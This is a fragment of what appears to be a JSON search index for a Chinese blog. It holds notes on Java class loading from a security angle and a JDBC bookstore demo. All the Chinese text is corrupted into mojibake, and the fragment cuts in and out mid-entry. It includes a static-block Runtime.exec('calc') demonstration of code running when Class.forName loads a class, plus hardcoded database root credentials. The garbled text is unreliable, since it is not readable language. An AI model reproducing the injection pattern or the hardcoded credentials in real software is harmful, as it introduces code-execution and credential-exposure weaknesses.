·æ‰èƒ½æ‰§è¡Œé‡Œé¢çš„å­—èŠ‚ç \nåˆå§‹åŒ– æ‰§è¡Œç±»æ„é€ å™¨\u0026lt;clinit\u0026gt;()æ–¹æ³•ï¼Œå¯¹ç±»å˜é‡ä»¥åŠç±»ä¸­å„ç§é™æ€ä»£ç å—ä¸­çš„å˜é‡è¿›è¡Œèµ‹å€¼æ“ä½œï¼ˆè¿™é‡Œæ˜¯ç±»å˜é‡åˆå§‹åŒ–ï¼Œè€Œä¸æ˜¯å®ä¾‹åˆå§‹åŒ–ï¼‰\nä¼šè°ƒç”¨java.lang.ClassLoaderåŠ è½½ç±»å­—èŠ‚ç ï¼ŒClassLoaderä¼šè°ƒç”¨JVMçš„nativeæ–¹æ³•ï¼ˆdefineClass0/1/2ï¼‰æ¥å®šä¹‰ä¸€ä¸ªjava.lang.Class å®ä¾‹\nå…¶ä¸­åŒ…æ‹¬ï¼š\næ‰§è¡Œstaticè¯­å¥å—ä¸­çš„è¯­å¥ å®Œæˆstaticå±æ€§çš„èµ‹å€¼æ“ä½œ å½“ç±»çš„ç›´æ¥çˆ¶ç±»è¿˜æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œåˆ™å…ˆåˆå§‹åŒ–å…¶ç›´æ¥çˆ¶ç±»ã€‚ ä½¿ç”¨ ç±»è®¿é—®æ–¹æ³•åŒºå†…çš„æ•°æ®ç»“æ„çš„æ¥å£ï¼Œ å¯¹è±¡æ˜¯å †åŒºä¸Šçš„çš„æ•°æ®\nå¸è½½ é‡Šæ”¾å†…å­˜\nJVMç»“æŸç±»ç”Ÿå‘½å‘¨æœŸçš„æƒ…å†µï¼š\næ‰§è¡Œäº†System.exit()æ–¹æ³• ç¨‹åºæ­£å¸¸æ‰§è¡Œç»“æŸ ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°äº†å¼‚å¸¸æˆ–é”™è¯¯è€Œå¼‚å¸¸ç»ˆæ­¢ ç”±äºæ“ä½œç³»ç»Ÿå‡ºç°é”™è¯¯è€Œå¯¼è‡´Javaè™šæ‹Ÿæœºè¿›ç¨‹ç»ˆæ­¢ ç±»çš„åŠ è½½æ—¶æœº JVMä¼šåœ¨ç¨‹åºç¬¬ä¸€æ¬¡ä¸»åŠ¨å¼•ç”¨ç±»çš„æ—¶å€™åŠ è½½è¯¥ç±»ï¼Œè¢«åŠ¨å¼•ç”¨æ—¶å¹¶ä¸ä¼šå¼•ç”¨ç±»åŠ è½½çš„æ“ä½œ\nä¸»åŠ¨å¼•ç”¨ï¼š\né‡åˆ°newã€getstaticã€putstaticã€invokestatic\nå­—èŠ‚ç æŒ‡ä»¤\nnewå®ä¾‹åŒ–å¯¹è±¡ è¯»å–è®¾ç½®ç±»çš„é™æ€å±æ€§ï¼ˆè¢«finalä¿®é¥°ï¼Œç¼–è¯‘æœŸæŠŠç»“æœæ”¾å…¥å¸¸é‡æ± ä¸­çš„é™æ€å­—æ®µé™¤å¤–ï¼‰ è°ƒç”¨ç±»çš„é™æ€æ–¹æ³• JVMå¯åŠ¨ï¼Œå…ˆåˆå§‹åŒ–åŒ…å«main()æ–¹æ³•çš„ä¸»ç±»\nåˆå§‹åŒ–ä¸€ä¸ªç±»æ—¶ï¼Œå…¶çˆ¶ç±»è¿˜æ²¡åˆå§‹åŒ–ï¼ˆéœ€å…ˆåˆå§‹åŒ–çˆ¶ç±»ï¼‰\nå¯¹ç±»è¿›è¡Œåå°„è°ƒç”¨\nJDK 1.7åŠ¨æ€è¯­è¨€æ”¯æŒï¼šä¸€ä¸ªjava.lang.invoke.MethodHandleçš„è§£æç»“æœä¸º REF_getStaticã€REF_putStaticã€REF_invokeStaticã€‚\nè¢«åŠ¨å¼•ç”¨ï¼š\né€šè¿‡å­ç±»å¼•ç”¨çˆ¶ç±»çš„é™æ€å˜é‡ï¼Œä¸ä¼šå¯¼è‡´å­ç±»åˆå§‹åŒ– Array[] arr = new Array[10]; ä¸ä¼šè§¦å‘ Array ç±»åˆå§‹åŒ–ï¼› static final VAR åœ¨ç¼–è¯‘é˜¶æ®µä¼šå­˜å…¥è°ƒç”¨ç±»çš„å¸¸é‡æ± ï¼Œé€šè¿‡ ClassName.VAR å¼•ç”¨ä¸ä¼šè§¦å‘ ClassName åˆå§‹åŒ–ã€‚ Class.forNameåŠ è½½æŒ‡å®šç±»ï¼Œä½†æŒ‡å®šå‚æ•° initialize ä¸º false é€šè¿‡ç±»åè·å–Classå¯¹è±¡ ç±»åŠ è½½å™¨ JavaæŠŠç±»åŠ è½½é˜¶æ®µä¸­çš„â€œé€šè¿‡ä¸€ä¸ªç±»çš„å…¨é™åæ¥è·å–æè¿°æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµâ€è¿™ä¸ªåŠ¨ä½œæ”¾åˆ°JVMå¤–éƒ¨å®ç°ï¼Œä»¥ä¾¿è®©åº”ç”¨ç¨‹åºè‡ªå·±å†³å®šå¦‚ä½•å»è·å–æ‰€éœ€è¦çš„ç±»ï¼Œå®ç°è¿™ä¸ªåŠ¨ä½œçš„ä»£ç æ¨¡å—ç§°ä¸ºâ€œç±»åŠ è½½å™¨â€\nå¯åŠ¨ç±»åŠ è½½å™¨(Bootstrap ClassLoader): è¿™ä¸ªç±»åŠ è½½å™¨è´Ÿè´£å°†\\libç›®å½•ä¸‹çš„ç±»åº“åŠ è½½åˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­ï¼Œç”¨æ¥åŠ è½½javaçš„æ ¸å¿ƒåº“,æ­¤ç±»åŠ è½½å™¨å¹¶ä¸ç»§æ‰¿äºjava.lang.ClassLoaderï¼Œä¸èƒ½è¢«javaç¨‹åºç›´æ¥è°ƒç”¨,ä»£ç æ˜¯ä½¿ç”¨C++ç¼–å†™çš„.æ˜¯è™šæ‹Ÿæœºè‡ªèº«çš„ä¸€éƒ¨åˆ†\næ‰©å±•ç±»åŠ è½½å™¨(Extendsion ClassLoader): è¿™ä¸ªç±»åŠ è½½å™¨è´Ÿè´£åŠ è½½\u0026lt;JAVA_HOME\u0026gt;\\lib\\extç›®å½•ä¸‹çš„ç±»åº“ï¼Œæˆ–è€…è¢«java.ext.dirsç³»ç»Ÿå˜é‡æ‰€æŒ‡å®šçš„è·¯å¾„ä¸­çš„æ‰€æœ‰ç±»åº“ï¼Œç”¨æ¥åŠ è½½javaçš„æ‰©å±•åº“ï¼Œå¼€å‘è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªç±»åŠ è½½å™¨\nåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨(Application ClassLoader): è¿™ä¸ªç±»åŠ è½½å™¨è´Ÿè´£åŠ è½½ç”¨æˆ·ç±»è·¯å¾„(CLASSPATH)ä¸‹çš„ç±»åº“ï¼Œä¸€èˆ¬æˆ‘ä»¬ç¼–å†™çš„javaç±»éƒ½æ˜¯ç”±è¿™ä¸ªç±»åŠ è½½å™¨åŠ è½½ï¼Œè¿™ä¸ªç±»åŠ è½½å™¨æ˜¯CLassLoaderä¸­çš„getSystemClassLoader()æ–¹æ³•çš„è¿”å›å€¼ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸ºç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™å°±æ˜¯ç³»ç»Ÿé»˜è®¤çš„ç±»åŠ è½½å™¨\nè‡ªå®šä¹‰ç±»åŠ è½½å™¨ é™¤æ­¤ä¹‹å¤–,æˆ‘ä»¬è¿˜å¯ä»¥åŠ å…¥è‡ªå·±å®šä¹‰çš„ç±»åŠ è½½å™¨,ä»¥æ»¡è¶³ç‰¹æ®Šçš„éœ€æ±‚,éœ€è¦ç»§æ‰¿java.lang.ClassLoaderç±».\nç±»åŠ è½½å™¨çš„æ ¸å¿ƒæ–¹æ³• å¯¹åº”ClassLoaderå¯¹è±¡\nloadclass åŠ è½½æŒ‡å®šçš„ç±» findclass æŸ¥æ‰¾æŒ‡å®šçš„javaç±» findLoadedClass æŸ¥æ‰¾JVMå·²ç»åŠ è½½è¿‡çš„ç±» defineClass å®šä¹‰ä¸€ä¸ªjavaç±» resolveClass é“¾æ¥æŒ‡å®šçš„javaç±» javaç±»åŠ¨æ€åŠ è½½æ–¹å¼ Javaç±»åŠ è½½æ–¹å¼åˆ†ä¸ºæ˜¾å¼å’Œéšå¼,æ˜¾å¼å³æˆ‘ä»¬é€šå¸¸ä½¿ç”¨Javaåå°„æˆ–è€…ClassLoaderæ¥åŠ¨æ€åŠ è½½ä¸€ä¸ªç±»å¯¹è±¡ï¼Œè€Œéšå¼æŒ‡çš„æ˜¯ç±»å.æ–¹æ³•å()æˆ–newç±»å®ä¾‹ã€‚æ˜¾å¼ç±»åŠ è½½æ–¹å¼ä¹Ÿå¯ä»¥ç†è§£ä¸ºç±»åŠ¨æ€åŠ è½½ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨å»åŠ è½½ä»»æ„çš„ç±»\nä¸Šé¢ä¸¤ç§ç±»åŠ¨æ€åŠ è½½æ–¹å¼ä¹Ÿæœ‰åŒºåˆ«ï¼ŒLoadClass()æ–¹æ³•åªå¯¹ç±»è¿›è¡ŒåŠ è½½ï¼Œä¸ä¼šå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ã€‚Class.forNameä¼šé»˜è®¤å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–\nClass.forName(\u0026quot;ç±»å\u0026quot;)é»˜è®¤ä¼šåˆå§‹åŒ–è¢«åŠ è½½ç±»çš„é™æ€å±æ€§å’Œæ–¹æ³•ï¼Œå› æ­¤å¯ä»¥æ³¨å…¥æ¶æ„ä»£ç \npublic class Test { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } } è€ŒClassLoader.loadClassé»˜è®¤ä¸ä¼šåˆå§‹åŒ–ç±»æ–¹æ³•\npublic class MyTest { public void abc() throws ClassNotFoundException { this.getClass().getClassLoader().loadClass(\u0026#34;evil.Test\u0026#34;); } public static void main(String[] args) throws Exception{ // Class.forName(\u0026#34;evil.Test\u0026#34;); MyTest myTest = new MyTest(); myTest.abc(); } } çœ‹ä¸Šå›¾ï¼Œåœ¨JVMç±»åŠ è½½å™¨ä¸­æœ€é¡¶å±‚çš„æ˜¯Bootstrap ClassLoaderï¼ˆå¼•å¯¼ç±»åŠ è½½å™¨ï¼‰ã€Extension ClassLoaderï¼ˆæ‰©å±•ç±»åŠ è½½å™¨ï¼‰ã€App ClassLoaderï¼ˆç³»ç»Ÿç±»åŠ è½½å™¨ï¼‰ï¼ŒAppClassLoaderæ˜¯é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¦‚æœç±»åŠ è½½æ—¶æˆ‘ä»¬ä¸æŒ‡å®šç±»åŠ è½½å™¨çš„æƒ…å†µä¸‹ï¼Œé»˜è®¤ä¼šä½¿ç”¨AppClassLoaderåŠ è½½ç±»ï¼ŒClassLoader.getSystemClassLoader()è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯AppClassLoader\nåœ¨è·å–ä¸€ä¸ªç±»çš„ç±»åŠ è½½å™¨çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šè¿”å›ä¸€ä¸ªnullå¯¹è±¡ï¼Œæ¯”å¦‚ï¼šjava.io.File.class.getClassLoader()å°†è¿”å›ä¸€ä¸ªnullå¯¹è±¡ï¼Œå› ä¸ºjava.io.Fileç±»åœ¨JVMåˆå§‹åŒ–æ—¶ä¼šè¢«å¼•å¯¼ç±»åŠ è½½å™¨åŠ è½½ï¼ˆè¯¥åŠ è½½å™¨å®ç°äºJVMå±‚ï¼Œé‡‡ç”¨c++ç¼–å†™ï¼‰ï¼Œåœ¨å°è¯•è·å–è¢«å¼•å¯¼ç±»åŠ è½½å™¨æ‰€åŠ è½½çš„ç±»æ—¶ï¼Œéƒ½ä¼šè¿”å›null\n",
        "summary": "javaå®‰å…¨åŸºç¡€-ç±»åŠ è½½ ç®€ä»‹ Javaç¨‹åºåœ¨è¿è¡Œå‰éœ€è¦å…ˆç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œjavaè™šæ‹Ÿæœºï¼ˆJVMï¼‰æŠŠæè¿°ç±»æ–‡ä»¶çš„æ•°æ®ä».classæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ï¼Œå¹¶å¯¹æ•°æ®è¿›è¡Œæ ¡éªŒã€è½¬æ¢ã€è§£æå’Œç±»åˆå§‹åŒ–ï¼Œæœ€ç»ˆå½¢æˆå¯ä»¥è¢«JVMä½¿ç”¨çš„javaç±»å‹ï¼Œä¸Šè¿°è¿‡ç¨‹ä¸­JVMçš„æ“ä½œè¢«ç§°ä¸ºJVMçš„ç±»åŠ è½½æœºåˆ¶\nç±»çš„ç”Ÿå‘½å‘¨æœŸ ç±»çš„ç”Ÿå‘½å‘¨æœŸï¼Œæ˜¯ä»åŠ è½½åˆ° JVM å†…å­˜å¼€å§‹ï¼Œåˆ°å¸è½½å‡º JVM å†…å­˜ç»“æŸ\næ•´ä¸ªç”Ÿå‘½å‘¨æœŸåŒ…æ‹¬ï¼šåŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€è§£æã€åˆå§‹åŒ–ã€ä½¿ç”¨ã€å¸è½½\nè€ŒéªŒè¯ã€å‡†å¤‡ã€è§£æä¸‰ä¸ªè¿‡ç¨‹åˆç§°ä¸ºè¿æ¥\nåŠ è½½ åŠ è½½å³æŸ¥æ‰¾å¹¶åŠ è½½ç±»çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œjvmåšäº†ä¸‰ä»¶äº‹ï¼š\né€šè¿‡ç±»çš„å…¨é™å®šåï¼ˆåŒ…å + ç±»åï¼‰æ¥è·å–å®šä¹‰æ­¤ç±»çš„äºŒè¿›åˆ¶å­—èŠ‚æµ å°†è¯¥å­—èŠ‚æµæ‰€ä»£è¡¨çš„é™æ€å­˜å‚¨ç»“æ„è½¬åŒ–ä¸ºè¿è¡Œæ—¶çš„æ•°æ®ç»“æ„ åœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„è®¿é—®å…¥é—¨ æ³¨ï¼š è¿æ¥é˜¶æ®µçš„éƒ¨åˆ†è¡Œä¸ºä¼šä¸åŠ è½½é˜¶æ®µäº¤å‰è¿›è¡Œï¼Œä¾‹å¦‚ï¼šåœ¨åŠ è½½å°šæœªç»“æŸæ—¶ï¼Œå°±å¯ä»¥å¯¹åŠ è½½æˆåŠŸçš„éƒ¨åˆ†äºŒè¿›åˆ¶æµè¿›è¡Œæ–‡ä»¶æ ¼å¼éªŒè¯\néªŒè¯ ç¡®ä¿è¢«åŠ è½½ç±»çš„æ­£ç¡®æ€§ï¼Œç”±äºclassæ–‡ä»¶æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œå¯ä»¥è¢«ä¿®æ”¹ï¼ŒéªŒè¯é˜¶æ®µå¯ä»¥é¿å…ä¸è§„èŒƒçš„classè¢«jvmä½¿ç”¨ï¼Œä»è€Œå±å®³jvmå®‰å…¨ï¼ŒéªŒè¯å†…å®¹å¦‚ä¸‹ï¼š\næ–‡ä»¶æ ¼å¼éªŒè¯\néªŒè¯å­—èŠ‚æµæ˜¯å¦ç¬¦åˆClassæ–‡ä»¶æ ¼å¼è§„èŒƒ\nå…ƒæ•°æ®éªŒè¯\nå¯¹å­—èŠ‚ç æè¿°çš„ä¿¡æ¯è¿›è¡Œè¯­ä¹‰åˆ†æï¼Œä»¥ä¿è¯å…¶æè¿°çš„ä¿¡æ¯ç¬¦åˆJavaè¯­è¨€è§„èŒƒè¦æ±‚\nå­—èŠ‚ç éªŒè¯\né€šè¿‡æ•°æ®æµå’Œæ§åˆ¶æµåˆ†æï¼Œç¡®å®šç¨‹åºè¯­ä¹‰æ˜¯å¦åˆæ³•ã€ç¬¦åˆé€»è¾‘\nç¬¦å·å¼•ç”¨éªŒè¯\nç¡®ä¿è§£æåŠ¨ä½œèƒ½æ­£ç¡®æ‰§è¡Œ\nå‡†å¤‡ æ­£å¼ä¸ºç±»çš„é™æ€å˜é‡åˆ†é…å†…å­˜ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼\nè¿™é‡Œçš„é»˜è®¤å€¼æ˜¯æ•°æ®ç±»å‹é»˜è®¤çš„é›¶å€¼ï¼ˆ0ã€0Lã€nullã€falseç­‰ï¼‰è€Œä¸æ˜¯ä»£ç ä¸­æ‰€åˆå§‹åŒ–çš„å€¼ï¼Œæ¯”å¦‚ï¼š\npublic static int value = 123; å‡†å¤‡é˜¶æ®µåç±»å˜é‡valueçš„å€¼æ˜¯0è€Œä¸æ˜¯123ï¼Œå› ä¸ºåœ¨å‡†å¤‡é˜¶æ®µè¿˜æ²¡æœ‰ä»»ä½•javaæ–¹æ³•è¢«æ‰§è¡Œï¼Œè€Œç»™ç±»å˜é‡èµ‹å€¼çš„æ“ä½œæ˜¯éœ€è¦è°ƒç”¨ç±»æ„é€ å™¨\u0026lt;clinit\u0026gt;()æ–¹æ³•ä¸­çš„putstaticæŒ‡ä»¤çš„\nå†…å­˜åˆ†é…ä»…åŒ…æ‹¬ç±»é™æ€å˜é‡ï¼Œå®ä¾‹å˜é‡å°†ä¼šåœ¨å¯¹è±¡å®ä¾‹åŒ–æ—¶éšç€å¯¹è±¡ä¸€èµ·åˆ†é…åˆ°Javaå †ä¸­\nå¯¹äºåŒæ—¶è¢«staticå’Œfinalä¿®é¥°çš„å¸¸é‡ï¼Œå¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™å°±ä¸ºå…¶æ˜¾ç¤ºçš„èµ‹å€¼ï¼›åªè¢«finalä¿®é¥°çš„å¸¸é‡ï¼Œåœ¨ä½¿ç”¨å‰å¿…é¡»ä¸ºå…¶æ˜¾ç¤ºçš„èµ‹å€¼ï¼Œç³»ç»Ÿä¸ä¼šä¸ºå…¶èµ‹äºˆé»˜è®¤é›¶å€¼ï¼Œå¦åˆ™IDEAä¼šæç¤ºæœªåˆå§‹åŒ–\nè§£æ æŠŠç±»ä¸­çš„ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨ã€‚\nç¬¦å·å¼•ç”¨ï¼šå­—ç¬¦ä¸²ï¼Œèƒ½æ ¹æ®è¿™ä¸ªå­—ç¬¦ä¸²å®šä½åˆ°æŒ‡å®šçš„æ•°æ®ï¼Œæ¯”å¦‚java/lang/StringBuilder\nç›´æ¥å¼•ç”¨ï¼šå†…å­˜åœ°å€æˆ–æŒ‡å‘å¯¹åº”å†…å­˜åœ°å€çš„æŒ‡é’ˆã€å¥æŸ„\nç¬¦å·å¼•ç”¨å°±åªæ˜¯ä¸€ä¸ªå­—é¢é‡ï¼Œä¸å†…å­˜ç»“æ„æ— å…³ï¼Œä»…ä»…é€šè¿‡å­—é¢é‡æ— æ³•ç¡®è®¤è¯¥å¼•ç”¨åœ¨jvmå†…å­˜ä¸­çš„åœ°å€ï¼Œä¹Ÿå°±æ— æ³•ä½¿ç”¨å®ƒï¼Œæ‰€ä»¥å¿…é¡»è¦å°†ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºèƒ½å¤Ÿå®šä½åˆ°å†…å­˜åœ°å€çš„ç›´æ¥å¼•ç”¨ï¼Œæ¯”å¦‚æˆ‘ä»¬è¦è°ƒç”¨System.out.printlnæ–¹æ³•ï¼Œæˆ‘ä»¬å¿…é¡»è¦æ‰¾åˆ°printlnæ–¹æ³•åœ¨å†…å­˜ä¸­çš„èµ·å§‹åœ°å€ï¼Œè¿™æ ·æ‰èƒ½æ‰§è¡Œé‡Œé¢çš„å­—èŠ‚ç \nåˆå§‹åŒ– æ‰§è¡Œç±»æ„é€ å™¨\u0026lt;clinit\u0026gt;()æ–¹æ³•ï¼Œå¯¹ç±»å˜é‡ä»¥åŠç±»ä¸­å„ç§é™æ€ä»£ç å—ä¸­çš„å˜é‡è¿›è¡Œèµ‹å€¼æ“ä½œï¼ˆè¿™é‡Œæ˜¯ç±»å˜é‡åˆå§‹åŒ–ï¼Œè€Œä¸æ˜¯å®ä¾‹åˆå§‹åŒ–ï¼‰\nä¼šè°ƒç”¨java.lang.ClassLoaderåŠ è½½ç±»å­—èŠ‚ç ï¼ŒClassLoaderä¼šè°ƒç”¨JVMçš„nativeæ–¹æ³•ï¼ˆdefineClass0/1/2ï¼‰æ¥å®šä¹‰ä¸€ä¸ªjava.lang.Class å®ä¾‹\nå…¶ä¸­åŒ…æ‹¬ï¼š\næ‰§è¡Œstaticè¯­å¥å—ä¸­çš„è¯­å¥ å®Œæˆstaticå±æ€§çš„èµ‹å€¼æ“ä½œ å½“ç±»çš„ç›´æ¥çˆ¶ç±»è¿˜æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œåˆ™å…ˆåˆå§‹åŒ–å…¶ç›´æ¥çˆ¶ç±»ã€‚ ä½¿ç”¨ ç±»è®¿é—®æ–¹æ³•åŒºå†…çš„æ•°æ®ç»“æ„çš„æ¥å£ï¼Œ å¯¹è±¡æ˜¯å †åŒºä¸Šçš„çš„æ•°æ®\nå¸è½½ é‡Šæ”¾å†…å­˜\nJVMç»“æŸç±»ç”Ÿå‘½å‘¨æœŸçš„æƒ…å†µï¼š\næ‰§è¡Œäº†System.exit()æ–¹æ³• ç¨‹åºæ­£å¸¸æ‰§è¡Œç»“æŸ ç¨‹åºåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°äº†å¼‚å¸¸æˆ–é”™è¯¯è€Œå¼‚å¸¸ç»ˆæ­¢ ç”±äºæ“ä½œç³»ç»Ÿå‡ºç°é”™è¯¯è€Œå¯¼è‡´Javaè™šæ‹Ÿæœºè¿›ç¨‹ç»ˆæ­¢ ç±»çš„åŠ è½½æ—¶æœº JVMä¼šåœ¨ç¨‹åºç¬¬ä¸€æ¬¡ä¸»åŠ¨å¼•ç”¨ç±»çš„æ—¶å€™åŠ è½½è¯¥ç±»ï¼Œè¢«åŠ¨å¼•ç”¨æ—¶å¹¶ä¸ä¼šå¼•ç”¨ç±»åŠ è½½çš„æ“ä½œ\nä¸»åŠ¨å¼•ç”¨ï¼š\né‡åˆ°newã€getstaticã€putstaticã€invokestatic\n"
    }
,
    {
        "title": "javaè¿›é˜¶ demo",
        "link": "/My-Knowlege-Database/blog/java%E5%BC%80%E5%8F%91/java%E8%BF%9B%E9%98%B6-demo/",
        "content": "javaè¿›é˜¶ demo JDBC Javaæ•°æ®åº“è¿æ¥çš„ä¸€å¥—æ¥å£ï¼ˆè§„èŒƒï¼‰\néœ€è¦åœ¨ç¨‹åºä¸­å¼•å…¥é©±åŠ¨åŒ…ï¼š\næ’å…¥æ“ä½œ package fun.yuy0ung.test01; import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLException; import java.sql.Statement; public class Test { public static void main(String[] args) throws ClassNotFoundException, SQLException { //åå°„åŠ è½½driveré©±åŠ¨ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); //è·å–è¿æ¥ String url = \u0026#34;jdbc:mysql://localhost:3306/Yuy0ung_DB?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowPublicKeyRetrieval=true\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;Admin123456\u0026#34;; Connection conn = DriverManager.getConnection(url,username,password); //åˆ›å»ºä¼šè¯ Statement stmt = conn.createStatement(); //å‘é€sqlå‘½ä»¤ int i = stmt.executeUpdate(\u0026#34;insert into my_book (id,name,author,price) values (3,\u0026#39;test\u0026#39;,\u0026#39;Yuy0ung\u0026#39;,49)\u0026#34;); //å¤„ç†ç»“æœ if(i \u0026gt; 0) { System.out.println(\u0026#34;success\u0026#34;); }else { System.out.println(\u0026#34;fail\u0026#34;); } //å…³é—­æ•°æ®åº“èµ„æº stmt.close(); conn.close(); } ;} è¿è¡Œç»“æœï¼š\næ•°æ®åº“æˆåŠŸå†™å…¥æ•°æ®ï¼š\nåˆ é™¤ ä¸¾ä¸€åä¸‰ï¼Œæ•°æ®æ›´æ–°çš„æ“ä½œç›´æ¥æ›´æ”¹sqlè¯­å¥å³å¯ï¼š\npackage fun.yuy0ung.test01; import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLException; import java.sql.Statement; public class Test { public static void main(String[] args) throws ClassNotFoundException, SQLException { //åå°„åŠ è½½driveré©±åŠ¨ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); //è·å–è¿æ¥ String url = \u0026#34;jdbc:mysql://localhost:3306/Yuy0ung_DB?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowPublicKeyRetrieval=true\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;Admin123456\u0026#34;; Connection conn = DriverManager.getConnection(url,username,password); //åˆ›å»ºä¼šè¯ Statement stmt = conn.createStatement(); //å‘é€sqlå‘½ä»¤ int i = stmt.executeUpdate(\u0026#34;DELETE FROM my_book\\n\u0026#34; + \u0026#34;WHERE id = 3 AND name = \u0026#39;test\u0026#39; AND author = \u0026#39;Yuy0ung\u0026#39; AND price = 49\u0026#34;); //å¤„ç†ç»“æœ if(i \u0026gt; 0) { System.out.println(\u0026#34;success\u0026#34;); }else { System.out.println(\u0026#34;fail\u0026#34;); } //å…³é—­æ•°æ®åº“èµ„æº stmt.close(); conn.close(); } ;} æ›´æ–°æˆåŠŸï¼š\næŸ¥è¯¢ æŸ¥è¯¢ä¸æ˜¯æ•°æ®æ›´æ–°æ“ä½œï¼Œéœ€è¦æ¢ä¸€ç§æ–¹å¼executeQueryï¼š\npackage fun.yuy0ung.test01; import java.sql.*; public class Test2 { public static void main(String[] args) throws ClassNotFoundException, SQLException { //åå°„åŠ è½½driveré©±åŠ¨ Class.forName(\u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;); //è·å–è¿æ¥ String url = \u0026#34;jdbc:mysql://localhost:3306/Yuy0ung_DB?useSSL=false\u0026amp;useUnicode=true\u0026amp;characterEncoding=utf8\u0026amp;serverTimezone=Asia/Shanghai\u0026amp;allowPublicKeyRetrieval=true\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;Admin123456\u0026#34;; Connection conn = DriverManager.getConnection(url,username,password); //åˆ›å»ºä¼šè¯ Statement stmt = conn.createStatement(); //å‘é€sqlå‘½ä»¤ ResultSet resultSet = stmt.executeQuery(\u0026#34;select * from my_book\u0026#34;); //ç»“æœé›†åˆResultSet //å¤„ç†ç»“æœ while (resultSet.next()) { //åˆ¤æ–­rsä¸­æ˜¯å¦æœ‰è®°å½•ï¼Œç±»ä¼¼é“¾è¡¨æŒ‡é’ˆ System.out.println(resultSet.getInt(\u0026#34;id\u0026#34;)+\u0026#34;---\u0026#34;+resultSet.getString(\u0026#34;name\u0026#34;)+\u0026#34;---\u0026#34;+resultSet.getString(\u0026#34;author\u0026#34;)+\u0026#34;---\u0026#34;+resultSet.getDouble(\u0026#34;price\u0026#34;)); } //å…³é—­æ•°æ®åº“èµ„æº stmt.close(); conn.close(); } ;} æˆåŠŸæŸ¥è¯¢ï¼š\nä¹¦åº—-JDBCåº”ç”¨ ä¹¦åº—åŠŸèƒ½å®ç°ï¼š\n1.æŸ¥è¯¢ä¹¦ç± 2.æŸ¥çœ‹æ‰€æœ‰ä¹¦ç± 3.ä¸‹æ¶å›¾ä¹¦ 4.ä¸Šæ¶å›¾ä¹¦ 5.é€€å‡ºç¨‹åº\nä¹¦åº—demoï¼š\npackage fun.yuy0ung.test02; import java.io.*; import java.sql.*; import java.util.ArrayList; import java.util.Scanner; public class Test { public static void main(String[] args) throws ClassNotFoundException, SQLException { //æ‰“å°èœå• while(true) { System.out.println(\u0026#34;-----------------------------------\u0026#34;); System.out.println(\u0026#34;è¿™é‡Œæ˜¯Yuy0ungçš„ä¹¦åº—\u0026#34;); System.out.println(\u0026#34;1.æŸ¥è¯¢ä¹¦ç±\u0026#34;); System.out.println(\u0026#34;2.æŸ¥çœ‹æ‰€æœ‰ä¹¦ç±\u0026#34;); System.out.println(\u0026#34;3.ä¸‹æ¶å›¾ä¹¦\u0026#34;); System.out.println(\u0026#34;4.ä¸Šæ¶å›¾ä¹¦\u0026#34;); System.out.println(\u0026#34;5.é€€å‡ºç¨‹åº\u0026#34;); System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦ä½¿ç”¨çš„åŠŸèƒ½åºå·\u0026#34;); //é”®ç›˜å½•å…¥ï¼Œä½¿ç”¨scannerç±» Scanner scanner = new Scanner(System.in); //å½•å…¥åºå· int choice = scanner.nextInt(); if (choice == 1) { System.out.println(\u0026#34;è¯·è¾“å…¥æƒ³è¦æŸ¥è¯¢çš„ä¹¦ç±ç¼–å·\u0026#34;); //é”®ç›˜å½•å…¥ä¹¦ç±NO. int bno = scanner.nextInt(); //æŸ¥è¯¢å¯¹åº”ç¼–å·ä¹¦ç±æ–¹æ³•è°ƒç”¨ Book b = findBookByBno(bno); //åˆ¤æ–­ä¹¦ç±æ˜¯å¦å­˜åœ¨ if (b == null) { System.out.println(\u0026#34;ä¹¦ç±ä¸å­˜åœ¨\u0026#34;); }else { 